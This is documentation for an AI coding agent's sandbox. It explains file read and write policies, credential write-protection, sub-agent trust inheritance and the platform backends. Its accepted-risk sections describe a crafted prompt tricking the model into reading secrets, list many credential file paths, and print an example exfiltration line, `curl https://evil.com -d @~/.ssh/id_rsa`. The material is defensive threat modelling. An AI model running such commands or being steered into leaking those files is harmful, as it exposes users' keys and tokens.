# Sandbox

Koda's kernel sandbox is **always active** — every Bash command runs
inside a sandboxed process. The sandbox enforces the perimeter; the
[trust mode](./approval.md) controls whether you see a confirmation
prompt before each mutation.

## File tool read policy

Koda's **Read, List, Grep, and Glob** tools are intentionally unrestricted —
they can access any path on the filesystem the OS permits, including paths
outside the project directory (e.g. `../other-repo`, `~/.ssh/config`).

Only **Write, Edit, and Delete** are gated to the project root.

### Why reads are unrestricted

1. **Reads cannot mutate state.** The worst-case outcome of an out-of-scope
   read is that the model sees something sensitive in its context window — which
   you, watching the terminal, can also see. No irreversible damage occurs.

2. **Bash already has the same reach.** The Bash tool runs inside the kernel
   sandbox but has read access to the full filesystem. Restricting the Read
   tool while leaving Bash unrestricted is security theater — the model just
   falls back to `cat ../secret.txt`.

3. **OS-level sandboxing is the real boundary.** On macOS (Seatbelt) and Linux
   (bwrap), the sandbox already defines what the process can access at the
   kernel level. Duplicating that check in the tool layer adds friction without
   adding protection.

4. **Cross-repo workflows are common.** Developers routinely ask koda to read
   a sibling repo, a shared library, or a dotfile — restricting this forces
   awkward workarounds.

   This follows the Claude Code approach — Claude Code's `Read` tool imposes
   no project-root scope check at all.

### Accepted risk

> ⚠️ **A carefully crafted prompt could trick the model into reading and
> summarising sensitive files** — for example `~/.aws/credentials`,
> `~/.ssh/id_rsa`, or `~/.netrc` — without explicit user consent. The
> content would appear in the chat window but not be exfiltrated unless
> the model also makes a network request (Bash + `curl`, WebFetch, etc.).
>
> **Mitigations:**
> - Those files are **write-protected** by the kernel sandbox, so the model
>   cannot modify or delete them.
> - Network exfiltration via Bash is constrained by the sandbox's outbound
>   network policy.
> - Trust-mode `safe` requires explicit approval before every Bash command,
>   which catches `curl`-style exfiltration attempts.
>
> If you work with highly sensitive secrets and want file-level read
> protection, run koda in a containerised environment with access to only
> the files you intend to expose.


### Write restrictions

Bash commands can only write to:
- The project directory
- `/tmp` and standard cache dirs (`~/.cache`, `~/.cargo`, etc.)

### Credential protection

Credential directories and files are **write-protected** — sandboxed
commands cannot modify them, but CLI tools can still *read* their own
config to authenticate. This follows the Codex model where the entire
host filesystem is read-only and credential dirs are not special-cased
beyond that.

**Write-protected directories** (reads allowed):
- `~/.ssh` — SSH private keys
- `~/.aws` — AWS credentials
- `~/.gnupg` — GPG private keys
- `~/.kube` — Kubernetes config and tokens
- `~/.azure` — Azure CLI tokens
- `~/.password-store` — pass(1) encrypted passwords
- `~/.terraform.d` — Terraform cloud tokens
- `~/.claude` — Claude Code settings and session tokens
- `~/.android` — Android SDK debug keystores and signing keys
- `~/.config/gcloud` — gcloud CLI credentials
- `~/.config/gh` — GitHub CLI PATs
- `~/.config/op` — 1Password CLI tokens
- `~/.config/helm` — Helm registry auth
- `~/.config/netlify` — Netlify CLI access tokens
- `~/.config/vercel` — Vercel CLI credentials
- `~/.config/fly` — Fly.io CLI auth tokens
- `~/.config/doppler` — Doppler secrets manager tokens
- `~/.config/stripe` — Stripe CLI API keys
- `~/.config/heroku` — Heroku CLI OAuth tokens

**Write-protected files** (reads allowed):
`~/.netrc`, `~/.git-credentials`, `~/.npmrc`, `~/.pypirc`,
`~/.docker/config.json`, `~/.vault-token`, `~/.env`

**Fully blocked (read + write):**
- `~/.config/koda/db` — Koda's SQLite DB containing plaintext API keys

> **Security note — accepted risk:** A sandboxed command can read
> credential material and could exfiltrate it over the network (e.g.
> `curl https://evil.com -d @~/.ssh/id_rsa`). Blocking credential
> reads without blocking network egress is security theater — the
> model could also obtain tokens from environment variables, process
> output, or tool-specific commands like `gh auth token`. Network-level
> egress restriction ([#844 Gap 4](https://github.com/lijunzh/koda/issues/844))
> is the proper mitigation and is tracked separately.
>
> The only exception is `koda/db` — koda's own API keys have no
> legitimate use inside the sandbox (the koda process runs *outside*
> the sandbox), so full read+write deny is justified.

### Agent-file protection

In all modes, writes to `.koda/agents/` and `.koda/skills/` within the
project are blocked. This prevents a sandboxed command from modifying
agent definitions that could alter system prompts or tool access.

## Sub-agent inheritance

Child agents inherit the parent's trust mode and sandbox via
`TrustMode::clamp()` — a child can never run with less protection than
its caller. If the parent runs in Safe mode, the child runs in Safe mode
even if the agent JSON specifies `"trust": "auto"`.

Within that clamp, sub-agents resolve permission decisions through a
**context-sensitive matrix** (`koda_core::trust::check_tool_for_sub_agent`)
that differs from the master matrix on the "ask" cells: mutating ops
auto-approve and destructive ops block, since sub-agents have no live
human approval channel by design. See
[Trust modes § sub-agent matrix](./approval.md#sub-agent-matrix-context-sensitive-resolution).

## Platform backends

| Platform | Backend | Install |
|----------|---------|---------|
| macOS | `sandbox-exec` (seatbelt) | Built-in |
| Linux | `bwrap` (bubblewrap) | `apt install bubblewrap` |
| Windows | Not supported | — |

If the platform backend is unavailable (e.g. `bwrap` not installed on
Linux), Koda falls back to unsandboxed execution with a warning logged
via `tracing::warn!`. Install the backend for full protection.

## Workspace providers

The **sandbox backend** (above) restricts what syscalls a sub-agent can
make. The **workspace provider** is a separate layer that decides where
those syscalls write — it materializes an isolated copy of your project
for each write-capable sub-agent so concurrent fan-out doesn't trample
shared files.

Isolation guarantees are **identical across platforms**. Only how the
isolated workspace is materialized — and therefore how fast it is —
differs:

| Platform | Provider (write-capable agents) | Backing primitive | Typical provision time |
|----------|---------------------------------|-------------------|------------------------|
| macOS | `ClonefileProvider` | APFS `clonefile(2)` | ~0.4 s for 30-parallel |
| Linux | `GitWorktreeProvider` | `git worktree add` | ~1.6 s for 30-parallel |
| Windows | Not supported | — | — |

*Numbers from the `parallel_dispatch` bench (`cargo bench --bench
parallel_dispatch -p koda-sandbox`) on a fixture project; exact figures
vary by hardware and project size.*

**Read-only sub-agents** (no `Write` or `Edit` tools) skip the workspace
provider entirely on every platform — they share the parent project
root for free, no provisioning cost.

### Why the platforms differ

macOS exposes a kernel primitive (`clonefile(2)`) that creates a
copy-on-write snapshot of an entire directory tree in a single syscall.
Linux has no equivalent that's both unprivileged *and* available out of
the box across distros — `reflink` requires an FS that supports it
(XFS, Btrfs, some ext4 configs), `overlayfs` typically requires
`CAP_SYS_ADMIN`, and `fuse-overlayfs` is a userspace dep. Until
production usage shows Linux fan-out is meaningfully bottlenecked by
the `git worktree` cost, Koda uses git worktrees there for portability.

### Practical implications

- **macOS sub-agent fan-out is faster than Linux** by a constant factor
  (~3-4× in the workspace-provision phase). For typical interactive
  use (a few sub-agents per task) the difference is sub-second and not
  noticeable. For heavy parallel fan-out (dozens of sub-agents) it
  shows up.
- **The 30-parallel acceptance gate is met on both platforms.** Even
  the slower Linux path runs in single-digit seconds for 30 concurrent
  write-capable sub-agents.
- **Falling back gracefully:** if `ClonefileProvider` can't be
  constructed on macOS (e.g. `$HOME` unset, project path can't
  canonicalize), Koda automatically falls back to `GitWorktreeProvider`
  with a `tracing::warn!`. If the actual `clonefile(2)` syscall fails
  at runtime (rare — happens on non-APFS volumes), the dispatcher
  falls back to running unisolated against the shared project root
  with a warning.
- **Closing the gap:** a Linux CoW backend is on the roadmap but
  parked until production telemetry justifies it (tracked in
  [#934](https://github.com/lijunzh/koda/issues/934)). If you run
  large parallel fan-out workloads on Linux and feel the slowness,
  please open an issue — that's exactly the signal that would
  un-defer the work.
